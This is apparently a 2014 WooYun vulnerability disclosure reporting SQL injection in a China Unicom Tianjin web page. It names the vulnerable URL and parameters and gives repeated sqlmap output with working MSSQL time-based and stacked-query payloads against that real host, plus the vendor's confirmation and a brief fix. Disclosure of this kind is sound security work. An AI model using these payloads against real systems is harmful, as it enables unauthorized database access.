wybug_title: 中国联通天津分公司存在SQL注射
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2014-06-10：	细节已通知厂商并且等待厂商处理中									2014-06-14：	厂商已经确认，细节仅向厂商公开									2014-06-24：	细节向核心白帽子及相关领域专家公开									2014-07-04：	细节向普通白帽子公开									2014-07-14：	细节向实习白帽子公开									2014-07-25：	细节向公众公开  简要描述： 中国联通天津分公司存在SQL注射。 延时注射跑得较慢。 详细说明：  http://6678.online.tj.cn/go.asp?url=http://www.sina.com.cn&id=23100&up_kind= url=http://www.sina.com.cn 存在sql注入漏洞http://6678.online.tj.cn/go.asp?url=http://www.sina.com.cn&id=23100&up_kind= id=23100 存在sql注入漏洞http://6678.online.tj.cn/go.asp?url=http://www.sina.com.cn&id=23100&up_kind= up_kind= 存在sql注入漏洞   漏洞证明：  ---Place: GETParameter: id    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: url=http://www.sina.com.cn&id=23100; WAITFOR DELAY '0:0:5'--&up_kind=    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: url=http://www.sina.com.cn&id=23100 WAITFOR DELAY '0:0:5'--&up_kind=---web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: url=http://www.sina.com.cn&id=23100; WAITFOR DELAY '0:0:5'--&up_kind=    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: url=http://www.sina.com.cn&id=23100 WAITFOR DELAY '0:0:5'--&up_kind=---web server operating system: Windows 2003web applicationsqlmap identified the following injection points with a total of 79 HTTP(s) requests:---Place: GETParameter: id    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: url=http://www.sina.com.cn&id=23100; WAITFOR DELAY '0:0:5'--&up_kind=    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: url=http://www.sina.com.cn&id=23100 WAITFOR DELAY '0:0:5'--&up_kind=---web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: url=http://www.sina.com.cn&id=23100; WAITFOR DELAY '0:0:5'--&up_kind=    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: url=http://www.sina.com.cn&id=23100 WAITFOR DELAY '0:0:5'--&up_kind=---web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000

延时注射 较慢就暂停了。   修复方案：  参数过滤   版权声明：转载请注明来源 Hotler0o@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-06-14 23:03 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给天津分中心处置，由其后续联系网站管理单位。 最新状态： 暂无
